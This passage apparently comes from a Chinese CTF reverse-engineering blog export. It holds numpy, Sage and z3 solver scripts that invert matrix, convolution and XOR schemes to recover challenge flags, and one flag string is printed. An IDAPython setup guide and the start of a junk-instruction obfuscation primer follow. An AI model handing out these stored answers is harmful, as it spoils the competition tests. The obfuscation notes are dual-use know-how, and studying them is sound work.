58,0x43,0x1D,0xB,0x34,0xF,0x19,0x36,0x25,0x58,0x43,0x55,0x58,0x3A,0x40,0x53,0x33,0x52,0xA,0x36,0x59,0x3B,0x9,0x31,0x59,0x4F,0x56,0x4D,0x16,0x54,0x59,0x1F,0x1B,0x41,0x60,0xA,0x51,0x4C,0x47,0x11,0x4E,0x46,0x7A,0xC,0x3D,0x19,0xE,0x2C,0x29,0x4E,0x17,0x19,0x3F,0x7,0xB,0x2E,0x28,0x52,0x4,0x5E,0x5E,0x5B,0x7,0x1D,0xC,0x4,0x0,0x12,0x22,0x4E,0x49,0x25,0x34,0x47,0x6,0x37,0x2D,0x29,0x2,0x5E,0x34,0x30,0x16,0x16,0x49,0x3B,0x1,0x4C,0x10,0x41,0x43,0x1E,0x22,0x34,0x5C,0x21,0x2,0x5F,0x18,0x22,0xB,0x26,0x5,0x2,0x4A,0x3B,0x3C,0xB,0x1C,0x4B,0x32,0x5B,0x15,0x37,0x22,0x20,0x5C,0xC0,0x5C,0x28,0x4B,0x36,0x10,0x53,0x5C,0x1C,0x51,0x0,0x4F,0x51,0x5B,0x1A,0x21,0x52,0x22,0x3E,0xC,0xF,0x1E,0x34,0xD,0x18,0x1E,0x4B,0x30,0x5C,0x29,0x14,0x5A,0x54,0x2E,0x27,0xE,0x5F,0x33,0x1F,0x1C,0x36,0x40,0x3D,0x40,0x10,0x5B,0x44,0xA,0x25,0x42,0x30,0x4,0x4,0x10,0x33,0x5B,0x9,0x2E,0x1A,0x3B,0x2D,0x58,0x59,0x8,0x5B,0x22,0x20,0x0,0x3A,0x43,0x2F,0x2F,0xB,0x54,0x18,0x8A]E = np.array(E).reshape(-1,24)B = [0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1]B = np.array(B).reshape(-1,24)init = [0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x0,0x0,0x30,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x43,0x0,0x0,0x44,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x30,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x44,0x0,0x0,0x47,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x41,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x47,0x0,0x0,0x54,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x41,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x54,0x0,0x0,0x43,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x30,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x43,0x0,0x0,0x44,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x30,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x44,0x0,0x0,0x47,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x41,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x47,0x0,0x0,0x54,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x41,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x54,0x0,0x0,0x43,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x30,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x43,0x0,0x0,0x44,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x30,0x0,0x0,0x33,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x44,0x0,0x0,0x47,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x33,0x0,0x0,0x41,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x47,0x0,0x0,0x54,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x41,0x0,0x0,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x33,0x43,0x30,0x44,0x33,0x47,0x41,0x54,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0]init = np.array(init).reshape(-1,26)K = [0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x13, 0x3D, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x1, 0xC, 0x3D, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x4, 0xC, 0xC, 0x36, 0x36, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x50, 0xC, 0xC, 0xC, 0xC, 0x3D, 0x6, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x5, 0x41, 0xC, 0x3D, 0x36, 0x3D, 0x12, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0xC, 0x3D, 0xC, 0x36, 0xC, 0x1F, 0x13, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x4F, 0x3B, 0x3B, 0x3B, 0x18, 0xC, 0x36, 0xC, 0x3D, 0x36, 0x1C, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3E, 0x54, 0x3B, 0x3B, 0x3B, 0x3B, 0x3F, 0x3D, 0x36, 0xC, 0x3D, 0x3D, 0x38, 0x37, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x16, 0x54, 0x3, 0x54, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x51, 0xC, 0x3D, 0x3D, 0x3D, 0x3D, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x43, 0x54, 0x54, 0x54, 0x54, 0x44, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x34, 0x3D, 0x3D, 0xC, 0x3B, 0x3B, 0x3B, 0x3B, 0x29, 0x3, 0x3, 0x54, 0x3, 0x32, 0x3C, 0x3B, 0x3B, 0x3B, 0x3B, 0x26, 0x46, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x19, 0x1F, 0x3B, 0x3B, 0x37, 0x54, 0x54, 0x54, 0x3, 0x49, 0x1, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x12, 0x49, 0x2F, 0x2C, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3D, 0x42, 0x2F, 0x3, 0x54, 0x54, 0x3F, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x26, 0x54, 0xC, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x10, 0x32, 0x3, 0x3, 0x3, 0x54, 0x41, 0x40, 0x3B, 0x3B, 0x3B, 0x6, 0x10, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x27, 0x31, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0xD, 0x32, 0x42, 0x3, 0x54, 0x54, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x1D, 0x27, 0x27, 0x4B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x20, 0x32, 0x54, 0x49, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x47, 0x24, 0x24, 0x24, 0x24, 0x4B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x4C, 0x44, 0x3B, 0x3B, 0x3B, 0x3B, 0x53, 0x24, 0x24, 0x24, 0x24, 0x27, 0x4A, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x22, 0x27, 0x24, 0x27, 0x24, 0x24, 0xF, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x4D, 0x24, 0x24, 0x24, 0x24, 0x24, 0x22, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x4F, 0x21, 0x1D, 0x24, 0x24, 0x24, 0x24, 0x9, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x14, 0x24, 0x24, 0x24, 0x24, 0x24, 0x24, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x52, 0x24, 0x24, 0x24, 0x24, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x4E, 0x24, 0x24, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B, 0xA]K = np.array(K).reshape(-1,24)H = (K - I) &amp; 0xffff #相减还原出H,这里要&amp;0xffff把范围界定好G=np.array(G).reshape(-1,24).tolist() #求G的逆矩阵Fp = Zmod(2**16 - 1) #规定运算域在0到0xffff之间，避免小数的出现G_T = [list(row) for row in ~matrix(Fp, G)] #习惯用numpy于是转为numpy的二维矩阵G_T = np.array(G_T).reshape(-1,24) #resharp()，-1为自动识别，24为行元素个数F = H @ G_T #H乘G的逆还原出FD = F - E #减E还原出DD = np.rot90(D,k=-1) #左旋转90度B_T = [list(row) for row in ~matrix(Fp, B)] #求B的逆矩阵B_T = np.array(B_T).reshape(-1,24)C = B_T @ D #同上还原出CA = C @ B_T #同上还原出AA = np.rot90(A,k=1) #顺时针转90度还原print(A)#z3解卷积from z3 import *s = Solver()#这里直接提取这个26*26的矩阵，修改我们输入的24*24的部分就行。var = [[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],     [0, 67, 48, 68, 51, 71, 65, 84, 51, 67, 48, 68, 51, 71, 65, 84, 51, 67, 48, 68, 51, 71, 65, 84, 51, 0],     [0, 48, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 67, 0],      [0, 68, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 48, 0],      [0, 51, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 68, 0],      [0, 71, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 51, 0],      [0, 65, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 71, 0],      [0, 84, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 65, 0],      [0, 51, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 84, 0],      [0, 67, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 51, 0],      [0, 48, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 67, 0],      [0, 68, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 48, 0],      [0, 51, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 68, 0],      [0, 71, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 51, 0],      [0, 65, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 71, 0],      [0, 84, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 65, 0],      [0, 51, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 84, 0],      [0, 67, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 51, 0],      [0, 48, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 67, 0],      [0, 68, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 48, 0],      [0, 51, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 68, 0],      [0, 71, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 51, 0],      [0, 65, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 71, 0],      [0, 84, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 49, 65, 0],      [0, 51, 67, 48, 68, 51, 71, 65, 84, 51, 67, 48, 68, 51, 71, 65, 84, 51, 67, 48, 68, 51, 71, 65, 84, 0],      [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]]for i in range(2,25):    for j in range(2,25):        var[i][j] = BitVec(f&quot;s&#123;i&#125;_&#123;j&#125;&quot;,8) #设定内部的24*24也就是我们输入的数据作为变量for i in range(24):    for j in range(24):        s.add(A[i][j] == var[i + 2][j + 2]+ var[i + 2][j + 1]+ var[i + 2][j] + var[i + 1][j + 2]+ var[i + 1][j + 1] + var[i + 1][j]+ var[i][j + 2]+ var[i][j + 1] + var[i][j]) #模拟卷积操作，添加约束条件flag = &quot;&quot;if s.check() == sat :    m = s.model()    for i in range(2,25):        for j in range(2,25):            flag += chr(m[var[i][j]].as_long()) #输出flag的结果print(flag)&quot;&quot;&quot;C0DEGATE 1s a gl0ba1 iCnternationa1 hacking d03f3ns3 competition                         andD 5ecurity conference. 3Held annually since 20G08, C0D3GAT3 is known Aas the Olympics for haTckers, wh3re hack3rs a3nd security 3xperts frCom around the world ga0th3r t0 c0mpet3 for thDe title of the w0rld&#x27;s3 best hack3r. In additGion to fierce competitAion among tru3 white-hTat hackers, a juni0r d3ivision is also he1d, Cs3rv1ng as a p1atform 0f0r discover1ng talentDed 1ndividuals 1n th3 3fi3ld of cyb3rsecurityG. You are good hacker.AC0D3GAT3C0D3GAT3C0D3GAT&quot;&quot;&quot;\n\nrandomsystem下面是TGCTF2025中的一道矩阵操作题目\n矩阵操作，换位，乘法，生成密钥，异或加密\nimport reimport numpy as npdef gettaable_byasm():    asm =   &quot;&quot;&quot;    mov     [ebp+var_104], 1mov     [ebp+var_100], 1mov     [ebp+var_FC], 0mov     [ebp+var_F8], 1mov     [ebp+var_F4], 0mov     [ebp+var_F0], 0mov     [ebp+var_EC], 1mov     [ebp+var_E8], 0mov     [ebp+var_E4], 0mov     [ebp+var_E0], 1mov     [ebp+var_DC], 1mov     [ebp+var_D8], 0mov     [ebp+var_D4], 0mov     [ebp+var_D0], 1mov     [ebp+var_CC], 0mov     [ebp+var_C8], 1mov     [ebp+var_C4], 0mov     [ebp+var_C0], 0mov     [ebp+var_BC], 1mov     [ebp+var_B8], 1mov     [ebp+var_B4], 0mov     [ebp+var_B0], 1mov     [ebp+var_AC], 1mov     [ebp+var_A8], 0mov     [ebp+var_A4], 0mov     [ebp+var_A0], 0mov     [ebp+var_9C], 0mov     [ebp+var_98], 1mov     [ebp+var_94], 0mov     [ebp+var_90], 1mov     [ebp+var_8C], 0mov     [ebp+var_88], 1mov     [ebp+var_84], 0mov     [ebp+var_80], 1mov     [ebp+var_7C], 0mov     [ebp+var_78], 0mov     [ebp+var_74], 1mov     [ebp+var_70], 0mov     [ebp+var_6C], 1mov     [ebp+var_68], 0mov     [ebp+var_64], 0mov     [ebp+var_60], 0mov     [ebp+var_5C], 0mov     [ebp+var_58], 0mov     [ebp+var_54], 0mov     [ebp+var_50], 1mov     [ebp+var_4C], 0mov     [ebp+var_48], 1mov     [ebp+var_44], 0mov     [ebp+var_40], 0mov     [ebp+var_3C], 0mov     [ebp+var_38], 0mov     [ebp+var_34], 0mov     [ebp+var_30], 0mov     [ebp+var_2C], 1mov     [ebp+var_28], 1mov     [ebp+var_24], 0mov     [ebp+var_20], 1mov     [ebp+var_1C], 1mov     [ebp+var_18], 0mov     [ebp+var_14], 0mov     [ebp+var_10], 0mov     [ebp+var_C], 0mov     [ebp+var_8], 1            &quot;&quot;&quot;    values = re.findall(r&quot;mov.*?,\\s*(\\d+)&quot;, asm)    values = [int(x) for x in values]    return valuesdef exchange(input, tableM):    inlen = len(input)    for i in range(32):        input[i], input[inlen - tableM[i] - 1] = input[inlen - tableM[i] - 1], input[i] #前32位与后32按盒位交换    return inputdef deexchange(input, tableM):    inlen = len(input)    for i in range(32):        input[inlen - tableM[i] - 1], input[i] = input[i], input[inlen - tableM[i] - 1] #前32位与后32按盒位交换    return inputdef changeKey(key):    data = []    for i in range(0, len(key), 2):        data.append((((key[i] - 48)&lt;&lt;4) | (key[i + 1] - 48)) &amp;0xff)    return datakey2 = [53, 50, 54, 53, 53, 54, 54, 53, 53, 50, 54, 53, 53, 51, 54, 53]mm = [376, 356, 169, 501, 277, 329, 139, 342, 380, 365, 162, 258, 381, 339, 347, 307, 263, 359, 162, 484, 310, 333, 346,      339, 150, 194, 175, 344, 158, 250, 128, 175, 158, 173, 152, 379, 158, 292, 130, 365, 197, 20, 197, 161, 198, 10,      207, 244, 202, 14, 204, 176, 193, 255, 35, 7, 158, 181, 145, 353, 153, 357, 246, 151]randi = [27, 26, 25, 23, 28, 1, 6, 10, 20, 7, 15, 14, 31, 18, 19, 21, 9, 30, 22, 24, 8, 2, 29, 3, 12, 11, 17, 16, 0, 13, 5, 4] #用c语言生成随机数MatrixB = gettaable_byasm()key = changeKey(key2)for i in range(len(mm)):    mm[i] ^= key[i % len(key)]B = np.array(mm).reshape(-1,8)A = np.array(MatrixB).reshape(-1,8) #转为矩阵-1为自适应invA = np.linalg.inv(A) #求逆res = invA @ B #矩阵乘法resl =deexchange(res.astype(int).flatten().tolist(),randi) #flatten降维，转成list,astype转为int类型flag =&#x27;&#x27;.join(map(chr,resl))print(flag)\n\n","categories":["Re学习"],"tags":["re,学习"]},{"title":"IDApython初步使用和花指令的初步学习","url":"/2025/01/07/%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/","content":"\nida版本为IDA9.0\n\n用VScode编写IDApython\n找到这个项目IDAcode,把下来的文件加到你ida的plugins文件夹中。\n修改idacode_utils&#x2F;settings.py中的PYTHON路径为本地的python路径\n在本地中用控制台安装依赖\n\npython -m pip install --user debugpy tornado\n\n在VScode中安装IDAcode插件\n在VScode按CTRL+Shift+P输入”Open User Settings(JSON)”打开后添加如下代码。\n\n&quot;python.autoComplete.extraPaths&quot;: [        &quot;E:\\\\CTFtoolsNEW\\\\Reverse\\\\IDA90\\\\python\\\\3&quot;   //你的ida库路径     ],     &quot;python.analysis.extraPaths&quot;: [        &quot;E:\\\\CTFtoolsNEW\\\\Reverse\\\\IDA90\\\\python\\\\3&quot;   //你的ida库路径   ],\n\n在VScode按CTRL+Shift+P，搜索ida即可找到想要的功能。\n在ida插件中打开idacode，显示Listening on 127.0.0.1:7065即成功。\n如果出现找不到依赖的报错，请在ida目录下找到并运行idapyswitch.exe，选择同样的python解释器(切换解释器可能会导致库的缺失，请自行安装缺失的库)。\n如果写的命令发到ida执行报错，请在VScode中选择同样的python解释器，不要用虚拟解释器。\n\n花指令混淆以及原理插入操作码\n常见的花指令字节码9A:CALL immed32E8:CALL immed16E9:JMP immed16EB:JMP immed821:addadd esp,1; 